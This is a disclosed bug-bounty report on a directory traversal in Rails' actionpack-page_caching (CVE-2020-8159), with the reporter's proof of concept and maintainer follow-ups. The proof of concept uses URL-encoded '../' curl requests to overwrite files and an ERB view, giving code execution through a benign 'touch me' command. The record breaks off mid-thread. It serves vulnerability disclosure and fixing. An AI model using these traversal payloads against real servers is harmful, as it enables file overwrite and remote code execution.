{"id":519220,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MTkyMjA=","url":"https://hackerone.com/reports/519220","title":"File writing by Directory traversal at actionpack-page_caching and RCE by it","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2019-03-31T07:25:13.608Z","submitted_at":"2019-03-31T07:25:13.608Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ooooooo_q","url":"/ooooooo_q","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":22,"url":"https://hackerone.com/rails","handle":"rails","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Ruby on Rails","twitter_handle":null,"website":"http://rubyonrails.org/security","about":"Web development that doesn't hurt."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2020-8159"],"singular_disclosure_disabled":false,"disclosed_at":"2020-07-13T02:45:21.644Z","bug_reporter_agreed_on_going_public_at":"2020-06-13T02:45:20.847Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I found a directory traversal in `actionpack-page_caching`.\nSome code may lead to RCE.\n\n\nhttps://github.com/rails/actionpack-page_caching/blob/master/lib/action_controller/caching/pages.rb#L143\n\n```ruby\n  def cache_file(path, extension)\n    if path.empty? || path =~ %r{\\A/+\\z}\n      name = \"/index\"\n    else\n      name = URI.parser.unescape(path.chomp(\"/\"))\n    end\n\n    if File.extname(name).empty?\n      name + (extension || default_extension)\n    else\n      name\n    end\n  end\n\n  def cache_path(path, extension = nil)\n    File.join(cache_directory, cache_file(path, extension))\n  end\n```\n\nThe problem is that traversal is not considered in cache_path or cache_file.\nSince the URL can use `.` or` / `encoded values, the cache will be written in an unexpected place.\n\n### PoC\n\n#### step 1. Prepare server\n\n```log\nruby -v\n\nrails -v\n\nrails new caching_traversal\n\ncd caching_traversal\n\n# add `gem \"actionpack-page_caching\"` in Gemfile\n\nbundle install\n\nrails generate scaffold book name:string\nrails db:migrate\n```\n\n#### step 2. Setting cache\n\nEnable caching.\n\n```log\nrails dev:cache\n```\n\nAdd `caches_page`.\n\n```ruby\n# app/controllers/books_contorller.rb\nclass BooksController \u003c ApplicationController\n  before_action :set_book, only: [:show, :edit, :update, :destroy]\n\n  caches_page :show\n```\n\n#### step 3. Start server\n\nStart the server with \"rails s\".\n\nPrepare a book with the following name.\n\n```\n\u003c% `toouch me` %\u003e\n```\n\n\nCheck cache behavior.\n\n```log\n‚ùØ curl \"http://localhost:3000/books/1\"\n\u003c!DOCTYPE html\u003e\n...\n\u003cp\u003e\n  \u003cstrong\u003eName:\u003c/strong\u003e\n  \u0026lt;% `touch me` %\u0026gt;\n\u003c/p\u003e\n...\n\n‚ùØ ls public\n404.html  500.html                          apple-touch-icon.png  favicon.ico\n422.html  apple-touch-icon-precomposed.png  books                 robots.txt\n\n‚ùØ cat public/books/1.html\n\u003c!DOCTYPE html\u003e\n...\n\u003cp\u003e\n  \u003cstrong\u003eName:\u003c/strong\u003e\n  \u0026lt;% `touch me` %\u0026gt;\n\u003c/p\u003e\n...\n\n```\n\n\n#### step 4. Attack \n\nAdd an attack code to the pass and check the result.\n\n```log\n‚ùØ curl \"http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2ftest\"\n\n# test file is generated\n‚ùØ ls\napp  config     db       Gemfile.lock  log           public    README.md  test       tmp\nbin  config.ru  Gemfile  lib           package.json  Rakefile  storage    test.html  vendor\n\n\n‚ùØ curl \"http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fREADME%2emd\"\n\n# If the file exists it will be overwritten\n‚ùØ cat README.md\n...\n\u003cp\u003e\n  \u003cstrong\u003eName:\u003c/strong\u003e\n  \u0026lt;% `touch me` %\u0026gt;\n\u003c/p\u003e\n...\n```\n\n#### step 5. RCE\n\nRCE is possible if it is possible to create a cache where the value of `\u003c%` is not escaped, like render for text.\n\nGenerate the file `app/views/books/show.text.erb` as follows:\n\n\n```\nname: \u003c%= @ book.name %\u003e\n```\n\nOverwriting erb files enables RCE.\n\n```log\n# overwrite erb\n‚ùØ curl \"http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fapp%2fviews%2fbooks%2fshow%2etext%2eerb?format=text\"\nname: \u003c% `touch me` %\u003e\n\n‚ùØ cat app/views/books/show.text.erb\nname: \u003c% `touch me` %\u003e\n\n\n# executed `touch me`\n‚ùØ curl \"http://localhost:3000/books/1.txt\"\nname:\n\n# me file is generated\n‚ùØ ls\napp  config     db       Gemfile.lock  log  package.json  Rakefile   storage  test.html  vendor\nbin  config.ru  Gemfile  lib           me   public        README.md  test     tmp\n```\n\n## Impact\n\nThe cache is generated on an unintended path. Also, RCE may be possible.","vulnerability_information_html":"\u003cp\u003eI found a directory traversal in \u003ccode\u003eactionpack-page_caching\u003c/code\u003e.\u003cbr\u003e\nSome code may lead to RCE.\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://github.com/rails/actionpack-page_caching/blob/master/lib/action_controller/caching/pages.rb#L143\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Frails%2Factionpack-page_caching%2Fblob%2Fmaster%2Flib%2Faction_controller%2Fcaching%2Fpages.rb%23L143\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/rails/actionpack-page_caching/blob/master/lib/action_controller/caching/pages.rb#L143\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e  \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003ecache_file\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eextension\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eempty?\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"n\"\u003epath\u003c/span\u003e \u003cspan class=\"o\"\u003e=~\u003c/span\u003e \u003cspan class=\"sr\"\u003e%r{\u003c/span\u003e\u003cspan class=\"se\"\u003e\\A\u003c/span\u003e\u003cspan class=\"sr\"\u003e/+\u003c/span\u003e\u003cspan class=\"se\"\u003e\\z\u003c/span\u003e\u003cspan class=\"sr\"\u003e}\u003c/span\u003e\n      \u003cspan class=\"nb\"\u003ename\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;/index\u0026quot;\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eelse\u003c/span\u003e\n      \u003cspan class=\"nb\"\u003ename\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eURI\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eparser\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eunescape\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003echomp\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;/\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"no\"\u003eFile\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003eextname\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e).\u003c/span\u003e\u003cspan class=\"nf\"\u003eempty?\u003c/span\u003e\n      \u003cspan class=\"nb\"\u003ename\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eextension\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"n\"\u003edefault_extension\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eelse\u003c/span\u003e\n      \u003cspan class=\"nb\"\u003ename\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\n  \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003ecache_path\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eextension\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kp\"\u003enil\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"no\"\u003eFile\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003ejoin\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ecache_directory\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ecache_file\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eextension\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eend\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe problem is that traversal is not considered in cache_path or cache_file.\u003cbr\u003e\nSince the URL can use \u003ccode\u003e.\u003c/code\u003e or\u003ccode\u003e/\u003c/code\u003eencoded values, the cache will be written in an unexpected place.\u003c/p\u003e\n\n\u003ch3 id=\"poc\"\u003ePoC\u003c/h3\u003e\n\n\u003ch4 id=\"step-1-prepare-server\"\u003estep 1. Prepare server\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eruby -v\n\nrails -v\n\nrails new caching_traversal\n\ncd caching_traversal\n\n# add `gem \u0026quot;actionpack-page_caching\u0026quot;` in Gemfile\n\nbundle install\n\nrails generate scaffold book name:string\nrails db:migrate\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch4 id=\"step-2-setting-cache\"\u003estep 2. Setting cache\u003c/h4\u003e\n\n\u003cp\u003eEnable caching.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003erails dev:cache\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAdd \u003ccode\u003ecaches_page\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e# app/controllers/books_contorller.rb\u003c/span\u003e\n\u003cspan class=\"k\"\u003eclass\u003c/span\u003e \u003cspan class=\"nc\"\u003eBooksController\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"no\"\u003eApplicationController\u003c/span\u003e\n  \u003cspan class=\"n\"\u003ebefore_action\u003c/span\u003e \u003cspan class=\"ss\"\u003e:set_book\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"ss\"\u003eonly: \u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"ss\"\u003e:show\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"ss\"\u003e:edit\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"ss\"\u003e:update\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"ss\"\u003e:destroy\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\n  \u003cspan class=\"n\"\u003ecaches_page\u003c/span\u003e \u003cspan class=\"ss\"\u003e:show\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch4 id=\"step-3-start-server\"\u003estep 3. Start server\u003c/h4\u003e\n\n\u003cp\u003eStart the server with \u0026quot;rails s\u0026quot;.\u003c/p\u003e\n\n\u003cp\u003ePrepare a book with the following name.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;% `toouch me` %\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eCheck cache behavior.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e‚ùØ curl \u0026quot;http://localhost:3000/books/1\u0026quot;\n\u0026lt;!DOCTYPE html\u0026gt;\n...\n\u0026lt;p\u0026gt;\n  \u0026lt;strong\u0026gt;Name:\u0026lt;/strong\u0026gt;\n  \u0026amp;lt;% `touch me` %\u0026amp;gt;\n\u0026lt;/p\u0026gt;\n...\n\n‚ùØ ls public\n404.html  500.html                          apple-touch-icon.png  favicon.ico\n422.html  apple-touch-icon-precomposed.png  books                 robots.txt\n\n‚ùØ cat public/books/1.html\n\u0026lt;!DOCTYPE html\u0026gt;\n...\n\u0026lt;p\u0026gt;\n  \u0026lt;strong\u0026gt;Name:\u0026lt;/strong\u0026gt;\n  \u0026amp;lt;% `touch me` %\u0026amp;gt;\n\u0026lt;/p\u0026gt;\n...\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch4 id=\"step-4-attack\"\u003estep 4. Attack\u003c/h4\u003e\n\n\u003cp\u003eAdd an attack code to the pass and check the result.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e‚ùØ curl \u0026quot;http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2ftest\u0026quot;\n\n# test file is generated\n‚ùØ ls\napp  config     db       Gemfile.lock  log           public    README.md  test       tmp\nbin  config.ru  Gemfile  lib           package.json  Rakefile  storage    test.html  vendor\n\n\n‚ùØ curl \u0026quot;http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fREADME%2emd\u0026quot;\n\n# If the file exists it will be overwritten\n‚ùØ cat README.md\n...\n\u0026lt;p\u0026gt;\n  \u0026lt;strong\u0026gt;Name:\u0026lt;/strong\u0026gt;\n  \u0026amp;lt;% `touch me` %\u0026amp;gt;\n\u0026lt;/p\u0026gt;\n...\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch4 id=\"step-5-rce\"\u003estep 5. RCE\u003c/h4\u003e\n\n\u003cp\u003eRCE is possible if it is possible to create a cache where the value of \u003ccode\u003e\u0026lt;%\u003c/code\u003e is not escaped, like render for text.\u003c/p\u003e\n\n\u003cp\u003eGenerate the file \u003ccode\u003eapp/views/books/show.text.erb\u003c/code\u003e as follows:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ename: \u0026lt;%= @ book.name %\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOverwriting erb files enables RCE.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e# overwrite erb\n‚ùØ curl \u0026quot;http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fapp%2fviews%2fbooks%2fshow%2etext%2eerb?format=text\u0026quot;\nname: \u0026lt;% `touch me` %\u0026gt;\n\n‚ùØ cat app/views/books/show.text.erb\nname: \u0026lt;% `touch me` %\u0026gt;\n\n\n# executed `touch me`\n‚ùØ curl \u0026quot;http://localhost:3000/books/1.txt\u0026quot;\nname:\n\n# me file is generated\n‚ùØ ls\napp  config     db       Gemfile.lock  log  package.json  Rakefile   storage  test.html  vendor\nbin  config.ru  Gemfile  lib           me   public        README.md  test     tmp\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eThe cache is generated on an unintended path. Also, RCE may be possible.\u003c/p\u003e\n","bounty_amount":"1000.0","formatted_bounty":"$1,000","weakness":{"id":19,"name":"Path Traversal"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-07-13T02:45:20.916Z","allow_singular_disclosure_after":-14614123.854351668,"singular_disclosure_allowed":true,"vote_count":72,"voters":["vuldog","holme","kapkan","prophet","renekroka","rahsec","badcracker","mygf","aporlox","mainteemoforfun","and 62 more..."],"severity":{"rating":"high","author_type":"User"},"structured_scope":{"databaseId":160,"asset_type":"SOURCE_CODE","asset_identifier":"https://github.com/rails/rails","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":4428104,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Ughh, nice find!\n\nLooks like this was introduced in https://github.com/rails/rails/commit/d4576673c0c8d39f89e9798ab89b2c475a9f5f85, to fix https://web.archive.org/web/20070303040451/http://dev.rubyonrails.org:80/ticket/1877, care of https://web.archive.org/web/20051112005838/http://typo.leetsoft.com/trac/ticket/249.\n\n\u003e There may be security implications if the encoded URL contains url-encoded ../../../..-type things. I suspect (but have not tested) that the web server will block most, if not all, of these.\n\nüò¨üò¨üò¨","markdown_message":"\u003cp\u003eUghh, nice find!\u003c/p\u003e\n\n\u003cp\u003eLooks like this was introduced in \u003ca title=\"https://github.com/rails/rails/commit/d4576673c0c8d39f89e9798ab89b2c475a9f5f85\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Frails%2Frails%2Fcommit%2Fd4576673c0c8d39f89e9798ab89b2c475a9f5f85\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/rails/rails/commit/d4576673c0c8d39f89e9798ab89b2c475a9f5f85\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, to fix \u003ca title=\"https://web.archive.org/web/20070303040451/http://dev.rubyonrails.org:80/ticket/1877\" href=\"/redirect?url=https%3A%2F%2Fweb.archive.org%2Fweb%2F20070303040451%2Fhttp%3A%2F%2Fdev.rubyonrails.org%3A80%2Fticket%2F1877\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://web.archive.org/web/20070303040451/http://dev.rubyonrails.org:80/ticket/1877\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, care of \u003ca title=\"https://web.archive.org/web/20051112005838/http://typo.leetsoft.com/trac/ticket/249\" href=\"/redirect?url=https%3A%2F%2Fweb.archive.org%2Fweb%2F20051112005838%2Fhttp%3A%2F%2Ftypo.leetsoft.com%2Ftrac%2Fticket%2F249\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://web.archive.org/web/20051112005838/http://typo.leetsoft.com/trac/ticket/249\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eThere may be security implications if the encoded URL contains url-encoded ../../../..-type things. I suspect (but have not tested) that the web server will block most, if not all, of these.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eüò¨üò¨üò¨\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-31T09:28:02.995Z","updated_at":"2019-03-31T09:28:02.995Z","actor":{"username":"matthewd","cleared":false,"url":"/matthewd","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/011/558/5df350e99e2e86f74de4e3bf90de8880ac877b25_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4944620,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@matthewd Any updates?","markdown_message":"\u003cp\u003e\u003ca href=\"/matthewd\"\u003e@matthewd\u003c/a\u003e Any updates?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-28T23:12:57.873Z","updated_at":"2019-05-28T23:12:57.873Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5048514,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@rails Any updates?","markdown_message":"\u003cp\u003e@rails Any updates?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-11T12:19:17.281Z","updated_at":"2019-06-11T12:19:17.281Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5691198,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@rails Any updates?","markdown_message":"\u003cp\u003e@rails Any updates?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-08-29T13:31:26.468Z","updated_at":"2019-08-29T13:31:26.468Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5756688,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Suggestion for correction.\n\n```\n--- a/lib/action_controller/caching/pages.rb\n+++ b/lib/action_controller/caching/pages.rb\n@@ -145,6 +145,7 @@ module ActionController\n               name = \"/index\"\n             else\n               name = URI.parser.unescape(path.chomp(\"/\"))\n+              name = Rack::Utils::clean_path_info(name)\n             end\n\n             if File.extname(name).empty?\n```\n","markdown_message":"\u003cp\u003eSuggestion for correction.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"gd\"\u003e--- a/lib/action_controller/caching/pages.rb\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/lib/action_controller/caching/pages.rb\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -145,6 +145,7 @@\u003c/span\u003e module ActionController\n               name = \u0026quot;/index\u0026quot;\n             else\n               name = URI.parser.unescape(path.chomp(\u0026quot;/\u0026quot;))\n\u003cspan class=\"gi\"\u003e+              name = Rack::Utils::clean_path_info(name)\n\u003c/span\u003e             end\n\n             if File.extname(name).empty?\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2019-09-08T14:13:12.361Z","updated_at":"2019-09-08T14:13:12.361Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6080786,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@matthewd @rails\nHow about the above correction?","markdown_message":"\u003cp\u003e\u003ca href=\"/matthewd\"\u003e@matthewd\u003c/a\u003e @rails\u003cbr\u003e\nHow about the above correction?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-19T13:20:13.324Z","updated_at":"2019-10-19T13:20:13.324Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6657720,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @ooooooo_q\n\nThank you for your heavy patience on this report. I have asked the internal team about this and will get back to you one we have an update.\n\nWe apologize for the lack of information to you. \n@chinch1lla ","markdown_message":"\u003cp\u003eHey \u003ca href=\"/ooooooo_q\"\u003e@ooooooo_q\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThank you for your heavy patience on this report. I have asked the internal team about this and will get back to you one we have an update.\u003c/p\u003e\n\n\u003cp\u003eWe apologize for the lack of information to you. \u003cbr\u003e\n\u003ca href=\"/chinch1lla\"\u003e@chinch1lla\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-30T10:44:02.241Z","updated_at":"2019-12-30T10:44:02.241Z","actor":{"username":"chinch1lla","cleared":false,"url":"/chinch1lla","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/3PY2FU5wvpPhJAVRPEwkHabD/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7710662,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@chinch1lla \nAny updates? Or should I make an issue on Github?","markdown_message":"\u003cp\u003e\u003ca href=\"/chinch1lla\"\u003e@chinch1lla\u003c/a\u003e \u003cbr\u003e\nAny updates? Or should I make an issue on Github?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-04-19T07:42:52.841Z","updated_at":"2020-04-19T07:42:52.841Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"rails","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7732297,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I asked for an update. Let's see if they respond.\n\nThanks and regards,\n@golden__retriever","markdown_message":"\u003cp\u003eI asked for an update. Let\u0026#39;s see if they respond.\u003c/p\u003e\n\n\u003cp\u003eThanks and regards,\u003cbr\u003e\n\u003ca 